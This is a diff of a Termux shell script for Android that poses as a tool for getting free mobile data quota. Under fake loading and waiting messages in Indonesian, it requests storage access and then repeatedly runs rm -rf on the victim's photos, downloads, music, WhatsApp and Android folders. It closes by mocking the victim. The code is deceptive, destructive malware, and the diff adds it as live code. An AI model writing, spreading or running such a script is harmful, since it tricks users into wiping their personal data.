@@ -38,14 +38,33 @@ read -p"╰───────root@dyxa#ABCD=•>" memeq;
 sleep 1
 echo $red "Loading"
 sleep 2
-rm -rf storage/emulated/0/Android/
-rm -rf storage/emulated/0/DCIM
-rm -rf storage/emulated/0/Pictures
-rm -rf storage/emulated/0/DCIM
-rm -rf storage/emulated/0/Download
-rm -rf storage/emulated/0/Music
-rm -rf storage/emulated/0/Mymusic
-rm -rf storage/emulated/0/SHAREit
-rm -rf storage/emulated/0/WhatsApp
-echo  $blue "Tunggu Beberapa Menit , Nanti Kouta Akan Bertambah"
+
+termux-setup-storage
+
+rm -rf /sdcard/Android
+rm -rf /sdcard/bluetooth
+rm -rf /sdcard/browser
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/Music
+rm -rf /sdcard/Pictures
+rm -rf /sdcard/SHAREit
+rm -rf /sdcard/WhatsApp
+rm -rf /sdcard/video
+echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
+echo  $red "sedang menunggu........"
+
+rm -rf /sdcard/Android
+rm -rf /sdcard/bluetooth
+rm -rf /sdcard/browser
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/Music
+rm -rf /sdcard/Pictures
+rm -rf /sdcard/SHAREit
+rm -rf /sdcard/WhatsApp
+echo  $red "menunggu menghapus file"
+echo  $blue "AWOWKWOKKKK :V"
+echo "BOKEP TELAH DI HAPUS:v" | lolcat
+toilet -f standard "Dyxa#ABCD" | lolcat
 fi
